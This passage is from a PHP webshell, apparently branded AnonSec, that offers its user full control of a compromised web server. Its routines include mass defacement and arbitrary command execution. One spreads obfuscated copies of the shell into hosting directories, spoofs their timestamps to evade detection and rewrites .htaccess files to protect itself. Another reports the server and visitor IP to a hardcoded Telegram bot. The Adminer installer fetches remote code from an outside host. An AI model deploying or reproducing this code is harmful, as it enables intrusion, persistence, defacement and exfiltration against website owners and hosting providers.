            echo "✅ Done! <a href='$folfig' target='_blank'>Click Here</a>";
        }
        die(author());
    }

    // HASH IDENTIFIER
    if ($opsi == "hashiden") {
        echo "<h3>🔑 HASH IDENTIFIER</h3>";
        echo '<form method="post"><input type="text" name="hash" placeholder="Your hash" class="up"><br><br>';
        echo '<input type="submit" name="submit" value="Identify" class="up"></form>';
        if (isset($_POST['submit']) && !empty($_POST['hash'])) {
            $hash = $_POST['hash'];
            $algorithms = [
                'MD5' => '/^[a-f0-9]{32}$/i',
                'SHA1' => '/^[a-f0-9]{40}$/i',
                'SHA256' => '/^[a-f0-9]{64}$/i',
                'SHA512' => '/^[a-f0-9]{128}$/i',
                'Bcrypt' => '/^\$2y\$[0-9]{2}\$[A-Za-z0-9\.\/]{53}$/',
            ];
            $found = 'Unknown';
            foreach ($algorithms as $name => $pattern) {
                if (preg_match($pattern, $hash)) { $found = $name; break; }
            }
            echo "Hash: <font color='lime'>$hash</font><br>Algorithm: $found";
        }
        die(author());
    }

    // LOCK FILE
    if ($opsi == "lockfile") {
        echo "<h3>🔒 LOCK FILE</h3>";
        echo '<form method="post"><input type="text" name="pile" placeholder="file.php" class="up"><br><br>';
        echo '<input type="submit" name="submit" value="Lock" class="up"></form>';
        if (isset($_POST['submit']) && !empty($_POST['pile'])) {
            $file = $_POST['pile'];
            if (file_exists($file) && is_writable($file)) {
                @system('chattr +i ' . escapeshellarg($file) . ' 2>/dev/null');
                @chmod($file, 0444);
                echo "<font color='lime'>✅ Locked: $file</font>";
            } else {
                echo "<font color='red'>❌ Failed to lock: $file</font>";
            }
        }
        die(author());
    }

    // SHELL FINDER
    if ($opsi == "scanshell") {
        echo "<h3>🔍 SHELL FINDER</h3>";
        echo '<form method="post"><input type="text" name="ext" placeholder="php" class="up"><br><br>';
        echo '<input type="text" name="peth" value="'.$lokasi.'" class="up"><br><br>';
        echo '<input type="submit" name="submit" value="Scan" class="up"></form>';
        if (isset($_POST['submit']) && !empty($_POST['ext']) && !empty($_POST['peth'])) {
            $dir = $_POST['peth'];
            $ext = $_POST['ext'];
            $rdi = new RecursiveDirectoryIterator($dir);
            foreach (new RecursiveIteratorIterator($rdi) as $filename => $file) {
                if (pathinfo($filename, PATHINFO_EXTENSION) == $ext) {
                    $content = file_get_contents($filename);
                    if (preg_match('/(eval|base64_decode|shell_exec|system|passthru|exec|gzinflate|str_rot13|backdoor|webshell|hacked|deface|alfa|b374k|gsocket)\s*\(/i', $content)) {
                        echo "Found: <font color='lime'>$filename</font> <a href='?viewfile=$filename&loknya=".dirname($filename)."' target='_blank'>view</a><br>";
                    }
                }
            }
        }
        die(author());
    }

    // MASS DEFACE (simple)
    if ($opsi == "massdef") {
        echo "<h3>💥 MASS DEFACE</h3>";
        echo '<form method="post"><input type="text" name="d_file" placeholder="file.html" class="up"><br><br>';
        echo '<input type="text" name="d_dir" value="'.$lokasi.'" class="up"><br><br>';
        echo '<textarea name="script" class="up" rows="5" placeholder="Hello World!"></textarea><br><br>';
        echo '<input type="submit" name="start" value="Deface" class="up"></form>';
        if (isset($_POST['start'])) {
            $d_file = $_POST['d_file'];
            $d_dir = $_POST['d_dir'];
            $script = $_POST['script'];
            $iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d_dir));
            foreach ($iter as $file) {
                if ($file->isDir()) {
                    $target = $file->getPathname() . '/' . $d_file;
                    if (is_writable($file->getPathname())) {
                        file_put_contents($target, $script);
                        echo "✅ " . $target . "
";
                    }
                }
            }
        }
        die(author());
    }

    // ADMINER
    if ($opsi == "adminer") {
        echo "<h3>🗄️ ADMINER INSTALLER</h3>";
        echo '<form method="post"><input type="text" name="miner" placeholder="adminer.php" class="up" value="adminer.php"><br><br>';
        echo '<input type="submit" name="gass" value="Install" class="up"></form>';
        if (isset($_POST['gass']) && !empty($_POST['miner'])) {
            $check = $lokasi . '/' . $_POST['miner'];
            $url = 'https://shell.prinsh.com/Nathan/adminer.txt';
            $content = @file_get_contents($url);
            if ($content && strlen($content) > 100) {
                file_put_contents($check, $content);
                $link = str_replace($_SERVER['DOCUMENT_ROOT'], $wb, $check);
                echo "<font color='lime'>✅ Adminer installed: <a href='$link' target='_blank'>$link</a></font>";
            } else {
                echo "<font color='red'>❌ Failed to install Adminer</font>";
            }
        }
        die(author());
    }

    // REVERSE IP
    if ($opsi == "repip") {
        echo "<h3>🔄 REVERSE IP</h3>";
        echo komend("curl -s https://api.hackertarget.com/reverseiplookup/?q=".$_SERVER['SERVER_NAME'], $lokasi);
        die(author());
    }

    // ============================================================
    // MASS HTACCESS — ALLOW / DENY + AUTO CHMOD 444
    // ============================================================
    if ($opsi == "htaccess_mass") {
        echo "<h3>🔥 MASS .HTACCESS — ALLOW / DENY + LOCK 444</h3>";
        echo '<form method="post">';
        echo 'Directory Root: <input type="text" name="ht_root" value="'.$lokasi.'" class="up" style="width:300px;"><br><br>';
        echo 'Mode: <select name="ht_mode" class="up">
                <option value="allow">Allow All</option>
                <option value="deny">Deny All (kecuali shell)</option>
              </select><br><br>';
        echo 'IP Allow (opsional, jika Deny): <input type="text" name="ht_ip" placeholder="Contoh: 192.168.1.100 atau kosongkan" class="up"><br><br>';
        echo 'Nama file shell (otomatis): <input type="text" name="ht_shell" value="'.basename(__FILE__).'" class="up" readonly><br><br>';
        echo '<input type="submit" name="run_ht_mass" value="Eksekusi Massal" class="up">';
        echo '</form>';

        if (isset($_POST['run_ht_mass'])) {
            $root = $_POST['ht_root'];
            $mode = $_POST['ht_mode'];
            $ip_allow = trim($_POST['ht_ip']);
            $shell_name = basename(__FILE__);

            if (!is_dir($root)) {
                red("❌ Direktori tidak valid!");
                die(author());
            }

            $count = 0;
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($root, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );

            foreach ($iterator as $path) {
                if ($path->isDir() && is_writable($path->getPathname())) {
                    $dir = $path->getPathname();
                    $htaccess = $dir . '/.htaccess';

                    if ($mode == 'allow') {
                        $content = "# Mass Allow by AnonSec
";
                        $content .= "Order Allow,Deny
";
                        $content .= "Allow from all
";
                    } else {
                        $content = "# Mass Deny by AnonSec
";
                        $content .= "Order Deny,Allow
";
                        $content .= "Deny from all
";
                        $content .= "<Files "$shell_name">
";
                        $content .= "    Allow from all
";
                        $content .= "</Files>
";
                        if (!empty($ip_allow)) {
                            $content .= "Allow from $ip_allow
";
                        }
                    }

                    if (file_put_contents($htaccess, $content)) {
                        @chmod($htaccess, 0444);
                        $count++;
                        echo "✅ $htaccess (Permission: 444) <br>";
                    } else {
                        echo "❌ Gagal: $htaccess <br>";
                    }
                }
            }

            green("🎯 Selesai! Total $count folder diproses, semua .htaccess di-lock 444.");
            die(author());
        }
    }

    // ============================================================
    // TEBAR WEBSHELL + HTACCESS ALLOW ONLY + SPOOF TIMESTAMP + OBFUSCATE
    // ============================================================
    if ($opsi == "tebar_webshell") {
        echo "<h3>🔥 TEBAR WEBSHELL + HTACCESS ALLOW ONLY + SPOOF TIMESTAMP + OBFUSCATE</h3>";
        echo '<form method="post">';
        echo 'Root Directory: <input type="text" name="tebar_root" value="/home/" class="up" style="width:300px;"><br><br>';
        echo 'Max Depth (misal 3): <input type="number" name="tebar_depth" value="3" class="up" min="1" max="10"><br><br>';
        echo 'Nama File Shell (kosongkan untuk acak): <input type="text" name="tebar_name" placeholder="misal: .systemd.php" class="up"><br><br>';
        echo 'Mode .htaccess: <select name="tebar_ht_mode" class="up">
                <option value="allow_only">Allow Only Shell File</option>
                <option value="allow_all">Allow All (biasa)</option>
              </select><br><br>';
        echo 'Spoof Timestamp: <select name="tebar_spoof" class="up">
                <option value="yes">Ya (samakan dengan file lain)</option>
                <option value="no">Tidak (biarkan waktu sekarang)</option>
              </select><br><br>';
        echo '<input type="submit" name="run_tebar" value="Tebar Sekarang" class="up">';
        echo '</form>';

        if (isset($_POST['run_tebar'])) {
            $root = $_POST['tebar_root'];
            $depth = intval($_POST['tebar_depth']);
            $name = trim($_POST['tebar_name']);
            if (empty($name)) {
                $name = '.systemd_' . rand(1000, 9999) . '.php';
            } else {
                if (!preg_match('/\.php$/i', $name)) $name .= '.php';
            }
            $ht_mode = $_POST['tebar_ht_mode'];
            $spoof = $_POST['tebar_spoof'] === 'yes';

            if (!is_dir($root)) {
                red("❌ Direktori root tidak valid!");
                die(author());
            }

            $content= file_get_contents(__FILE__);
            if (empty($content)) {
                red("❌ Gagal membaca file shell!");
                die(author());
            }

            $cmd = 'find ' . escapeshellarg($root) . ' -maxdepth ' . $depth . ' -type d \( -name "public_html" -o -name "www" -o -name "htdocs" -o -name "html" \) 2>/dev/null';
            $output = komenb($cmd, $lokasi);
            $dirs = array_filter(explode("
", $output));

            if (empty($dirs)) {
                $cmd2 = 'find ' . escapeshellarg($root) . ' -maxdepth ' . $depth . ' -type d -writable 2>/dev/null | head -30';
                $output2 = komenb($cmd2, $lokasi);
                $dirs = array_filter(explode("
", $output2));
            }

            if (empty($dirs)) {
                red("❌ Tidak ada folder yang ditemukan atau writable.");
                die(author());
            }

            $count = 0;
            $success_dirs = [];
            foreach ($dirs as $dir) {
                $dir = trim($dir);
                if (!is_dir($dir) || !is_writable($dir)) continue;

                $target_file = $dir . '/' . $name;
                if (obfuscate_file(__FILE__, $target_file)) {
                    @chmod($target_file, 0644);
                    echo "✅ Shell ditempatkan: $target_file (obfuscated)<br>";

                    if ($spoof) {
                        $ref_file = $dir . '/index.php';
                        if (!file_exists($ref_file)) {
                            $php_files = glob($dir . '/*.php');
                            if (!empty($php_files)) {
                                $ref_file = $php_files[0];
                            } else {
                                $all_files = array_diff(scandir($dir), ['.', '..', '.htaccess']);
                                if (!empty($all_files)) {
                                    $ref_file = $dir . '/' . $all_files[0];
                                }
                            }
                        }
                        if (file_exists($ref_file)) {
                            $ts = filemtime($ref_file);
                            if ($ts) {
                                touch($target_file, $ts, $ts);
                                echo "  🕒 Timestamp disamakan dengan $ref_file<br>";
                            }
                        } else {
                            $ts = time() - 3600;
                            touch($target_file, $ts, $ts);
                            echo "  🕒 Timestamp di-set 1 jam lalu (tidak ada referensi)<br>";
                        }
                    }

                    $htaccess = $dir . '/.htaccess';
                    if ($ht_mode == 'allow_only') {
                        $ht_content = "# Allow only this shell file
";
                        $ht_content .= "Order Deny,Allow
";
                        $ht_content .= "Deny from all
";
                        $ht_content .= "<Files "" . basename($target_file) . "">
";
                        $ht_content .= "    Allow from all
";
                        $ht_content .= "</Files>
";
                    } else {
                        $ht_content = "# Allow all
";
                        $ht_content .= "Order Allow,Deny
";
                        $ht_content .= "Allow from all
";
                    }

                    if (file_put_contents($htaccess, $ht_content)) {
                        @chmod($htaccess, 0444);
                        echo "  ✅ .htaccess dibuat: $htaccess (444)<br>";
                    } else {
                        echo "  ❌ Gagal buat .htaccess di $dir<br>";
                    }
                    $count++;
                    $success_dirs[] = $dir;
                } else {
                    echo "❌ Gagal menulis ke $target_file<br>";
                }
            }

            // Kirim notifikasi Telegram
            if ($count > 0) {
                $telegram_token = "8634064744:AAHQZdGNdWW0MFQX9zwWca0bmLTskVuAcRA";
                $telegram_chat = "8930174463";
                $msg = "🔥 WEBSHELL SPREAD COMPLETE 🔥
";
                $msg .= "Root: $root
";
                $msg .= "Depth: $depth
";
                $msg .= "Nama file: $name
";
                $msg .= "Mode htaccess: $ht_mode
";
                $msg .= "Spoof: " . ($spoof ? 'Ya' : 'Tidak') . "
";
                $msg .= "Total sukses: $count folder
";
                $msg .= "Server: " . $_SERVER['HTTP_HOST'] . "
";
                $msg .= "IP: " . $_SERVER['REMOTE_ADDR'] . "
";
                $msg .= "Waktu: " . date('Y-m-d H:i:s');

                if (function_exists('curl_init')) {
                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$telegram_token/sendMessage");
                    curl_setopt($ch, CURLOPT_POST, 1);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $telegram_chat, 'text' => $msg]));
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
                    @curl_exec($ch);
                    @curl_close($ch);
                } else {
                    @file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$telegram_chat&text=" . urlencode($msg));
                }
            }

            green("🎯 Selesai! Total $count folder berhasil ditebar.");
            die(author());
        }
    }
}

// ============================================================
// FILE LIST
// ============================================================
echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first"><td><center>Name</center></td><td><center>Size</center></td><td><center>Last Modified</center></td><td><center>Owner / Group</center></td><td><center>Permissions</center></td><td><center>Options</center></td></tr>';

$euybrekw = str_replace(basename($lokasi), "", $lokasi);
echo "<tr><td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href="?loknya=".$euybrekw."">..</a></td>
<td><center>--</center></td><td><center>".fdt($euybrekw)."</center></td>
<td><center>".gor($euybrekw)." / ".ggr($euybrekw)."</center></td>
<td><center>"; if(is_writable($euybrekw)) echo '<font color="green">'; elseif(!is_readable($euybrekw)) echo '<font color="red">'; echo statusnya($euybrekw); if(is_writable($euybrekw) || !is_readable($euybrekw)) echo '</font>'; echo "</center></td>
<td><center><form method="POST" action="?pilihan&loknya=$lokasi">
<input type="hidden" name="type" value="dir"><input type="hidden" name="loknya" value="$lokasi/">
<button type='submit' class='btf' name='pilih' value='folder'><i class='fa fa-folder'></i></button>
<button type='submit' class='btf' name='pilih' value='file'><i class='fa fa-file'></i></button>
</form></center>"; echo "</tr>";

foreach($lokasinya as $ppkcina){
    $euybre = $lokasi."/".$ppkcina;
    if(!is_dir($euybre) || $ppkcina == '.' || $ppkcina == '..') continue;
    echo "<tr><td><i class='fa fa-folder' style='color: #ffe9a2'></i> <a href="?loknya=".$euybre."">".$ppkcina."</a></td>
    <td><center>--</center></td><td><center>".fdt($euybre)."</center></td>
    <td><center>".gor($euybre)." / ".ggr($euybre)."</center></td>
    <td><center>"; if(is_writable($euybre)) echo '<font color="green">'; elseif(!is_readable($euybre)) echo '<font color="red">'; echo statusnya($euybre); if(is_writable($euybre) || !is_readable($euybre)) echo '</font>'; echo "</center></td>
    <td><center><form method="POST" action="?pilihan&loknya=$lokasi">
    <input type="hidden" name="type" value="dir"><input type="hidden" name="name" value="$ppkcina"><input type="hidden" name="loknya" value="$lokasi/$ppkcina">
    <button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil'></i></button>
    <button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear'></i></button>
    <button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash'></i></button>
    </form></center></td></tr>";
}

echo '<tr class="first"><td></td><td></td><td></td><td></td><td></td><td></td></tr>';

foreach($lokasinya as $mekicina) {
    if(!is_file($lokasi."/".$mekicina)) continue;
    $size = filesize($lokasi."/".$mekicina)/1024;
    $size = round($size,3);
    if($size >= 1024){ $size = round($size/1024,2).' MB'; } else { $size = $size.' KB'; }
    echo "<tr><td>".cfn($mekicina)." <a href="?viewfile=$lokasi/$mekicina&loknya=$lokasi">$mekicina</a></td>
    <td><center>".$size."</center></td><td><center>".fdt($lokasi."/".$mekicina)."</center></td>
    <td><center>".gor($lokasi."/".$mekicina)." / ".ggr($lokasi."/".$mekicina)."</center></td>
    <td><center>"; if(is_writable($lokasi."/".$mekicina)) echo '<font color="green">'; elseif(!is_readable($lokasi."/".$mekicina)) echo '<font color="red">'; echo statusnya($lokasi."/".$mekicina); if(is_writable($lokasi."/".$mekicina) || !is_readable($lokasi."/".$mekicina)) echo '</font>'; echo "</center></td>
    <td><center><form method="post" action="?pilihan&loknya=$lokasi">
    <button type='submit' class='btf' name='pilih' value='edit'><i class='fa fa-edit'></i></button>
    <button type='submit' class='btf' name='pilih' value='ubahnama'><i class='fa fa-pencil'></i></button>
    <button type='submit' class='btf' name='pilih' value='ubahmod'><i class='fa fa-gear'></i></button>
    <button type='submit' class='btf' name='pilih' value='dunlut'><i class='fa fa-download'></i></button>
    <button type='submit' class='btf' name='pilih' value='hapus'><i class='fa fa-trash'></i></button>
    <input type="hidden" name="type" value="file"><input type="hidden" name="name" value="$mekicina"><input type="hidden" name="loknya" value="$lokasi/$mekicina">
    </form></center></td></tr>";
}
echo '</table>';
author();

// ============================================================
// HANDLER MANUAL (Edit, Rename, Chmod, Delete, Download)
// ============================================================
if (isset($_GET['pilihan'])) {
    $pilih = $_GET['pilihan'];
    if (isset($_POST['pilih']) && $_POST['pilih'] == "hapus") {
        if (is_dir($_POST['loknya'])) {
            xrd($_POST['loknya']);
            green("Deleted Directory");
        } elseif (is_file($_POST['loknya'])) {
            unlink($_POST['loknya']);
            green("Deleted File");
        }
        die(author());
    }
    if (isset($_POST['pilih']) && $_POST['pilih'] == "ubahnama") {
        if (isset($_POST['gantin'])) {
            $new = $_GET['loknya']."/".$_POST['newname'];
            @rename($_POST['loknya'], $new);
            green("Renamed");
        } else {
            echo '<form method="post"><input type="text" name="newname" value="'.basename($_POST['loknya']).'" class="up"><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahnama"><input type="submit" name="gantin" value="Rename" class="up"></form>';
        }
        die(author());
    }
    if (isset($_POST['pilih']) && $_POST['pilih'] == "ubahmod") {
        if (isset($_POST['cemod'])) {
            @chmod($_POST['loknya'], octdec($_POST['perm']));
            green("Chmod changed");
        } else {
            echo '<form method="post"><input type="text" name="perm" value="'.substr(sprintf('%o', fileperms($_POST['loknya'])), -4).'" class="up"><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="ubahmod"><input type="submit" name="cemod" value="Change" class="up"></form>';
        }
        die(author());
    }
    if (isset($_POST['pilih']) && $_POST['pilih'] == "edit") {
        if (isset($_POST['gasedit'])) {
            file_put_contents($_POST['loknya'], $_POST['src']);
            green("File saved");
        } else {
            echo '<form method="post"><textarea name="src" rows="20" cols="80">'.htmlspecialchars(file_get_contents($_POST['loknya'])).'</textarea><br><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="edit"><input type="submit" name="gasedit" value="Save" class="up"></form>';
        }
        die(author());
    }
    if (isset($_POST['pilih']) && $_POST['pilih'] == "dunlut") {
        dunlut($_POST['loknya']);
        die(author());
    }
    if (isset($_POST['pilih']) && $_POST['pilih'] == "folder") {
        if (isset($_POST['buatfolder'])) {
            mkdir($_POST['loknya']."/".$_POST['folderbaru']);
            green("Folder created");
        } else {
            echo '<form method="post"><input type="text" name="folderbaru" class="up"><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="folder"><input type="submit" name="buatfolder" value="Create" class="up"></form>';
        }
        die(author());
    }
    if (isset($_POST['pilih']) && $_POST['pilih'] == "file") {
        if (isset($_POST['buatfile'])) {
            file_put_contents($_POST['loknya']."/".$_POST['filebaru'], "");
            green("File created");
        } else {
            echo '<form method="post"><input type="text" name="filebaru" class="up"><input type="hidden" name="loknya" value="'.$_POST['loknya'].'"><input type="hidden" name="pilih" value="file"><input type="submit" name="buatfile" value="Create" class="up"></form>';
        }
        die(author());
    }
}

// VIEW FILE
if (isset($_GET['viewfile'])) {
    $file = $_GET['viewfile'];
    if (file_exists($file) && is_readable($file)) {
        echo "<h3>📄 ".basename($file)."</h3>";
        echo "<pre>".htmlspecialchars(file_get_contents($file))."</pre>";
        echo "<a href='?loknya=".dirname($file)."' class='btn btn-outline-light'>Back</a>";
    } else {
        echo "File not found or unreadable.";
    }
    die(author());
}

// KOMEND EXEC
if (isset($_POST['komends'])) {
    if (isset($_POST['komend'])) {
        $lk = isset($_GET['loknya']) ? $_GET['loknya'] : getcwd();
        echo komend($_POST['komend'], $lk);
        die();
    }
}
?>
</body>
</html>